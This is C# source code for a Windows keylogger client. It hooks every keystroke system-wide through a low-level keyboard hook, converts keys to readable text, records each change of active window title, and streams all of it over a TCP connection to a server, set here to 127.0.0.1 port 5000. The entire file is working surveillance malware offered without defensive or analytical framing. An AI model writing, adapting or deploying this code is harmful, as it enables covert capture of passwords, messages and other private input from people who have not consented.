using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace KeyloggerClient
{
    static class Keylogger
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static string lastWindow = "";
        private static TcpClient client;
        private static NetworkStream stream;

        //Special keys have different names in the keyboard hook than what is actually on the keyboard
        //Dictionary to increase readability
        private static readonly Dictionary<string, string> KeyMap = new()
        {
            { "Space", " " },
            { "Enter", "\n[Enter]\n" },
            { "Tab", "[Tab]" },
            { "LShiftKey", "[LShiftKey]" },
            { "LControlKey", "[LControlKey]" },
            { "LWin", "[LWindowsKey]" },
            { "RShiftKey", "[RShiftKey]" },
            { "RControlKey", "[RControlKey]" },
            { "Home", "[Home]" },
            { "PageUp", "[PageUp]" },
            { "PageDown", "[PageDown]" },
            { "Next", "[Next]" },
            { "End", "[End]" },
            { "Up", "[Up]" },
            { "Down", "[Down]" },
            { "Left", "[Left]" },
            { "Right", "[Right]" },
            { "Escape", "[Escape]" },
            { "Oemtilde", "~" },
            { "OemMinus", "-" },
            { "Oemplus", "+" },
            { "Oem4", "[" },
            { "Oem6", "]" },
            { "OemPipe", "\\" },
            { "OemSemicolon", ";" },
            { "OemQuotes", "'" },
            { "Oemcomma", "," },
            { "OemPeriod", "." },
            { "Oem2", "/" }
        };

        public static void Start()
        {
            _hookID = SetHook(_proc);
            Application.ApplicationExit += (sender, e) =>
            {
                UnhookWindowsHookEx(_hookID);
                CloseConnection();
            };

            // Open persistent connection to server
            try
            {
                client = new TcpClient("127.0.0.1", 5000); //127.0.0.1
                stream = client.GetStream();
                Console.WriteLine("Connected to server");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception: " + ex.Message);
            }

            // Start active window monitor in its own thread
            Thread windowThread = new Thread(MonitorActiveWindow);
            windowThread.IsBackground = true;
            windowThread.Start();
        }

        private static void MonitorActiveWindow()
        {
            while (true)
            {
                string currentWindow = ActiveWindow.GetActiveWindowTitle();

                if (!string.IsNullOrEmpty(currentWindow) && currentWindow != lastWindow)
                {
                    lastWindow = currentWindow;
                    SendKeyToServer("\n\n[New Active Window: " + currentWindow +"]\n");
                }

                Thread.Sleep(500); 
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();

                string processedKey = NormalizeKey(key);
                SendKeyToServer(processedKey);
            }
            
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void SendKeyToServer(string key)
        {
            try
            {
                if (client != null && stream != null && client.Connected)
                {
                    byte[] data = System.Text.Encoding.ASCII.GetBytes(key);
                    stream.Write(data, 0, data.Length);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception: " + ex.Message);
            }
        }

        private static void CloseConnection()
        {
            if (stream != null) stream.Close();
            if (client != null) client.Close();
        }

        private static string NormalizeKey(string key)
        {
            // D0–D9 = 0–9
            if (key.Length == 2 && key[0] == 'D' && char.IsDigit(key[1]))
            {
                return key[1].ToString();
            }

            // Special key mappings
            if (KeyMap.TryGetValue(key, out string mapped))
            {
                return mapped;
            }

            // Default
            return key;
        }


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}
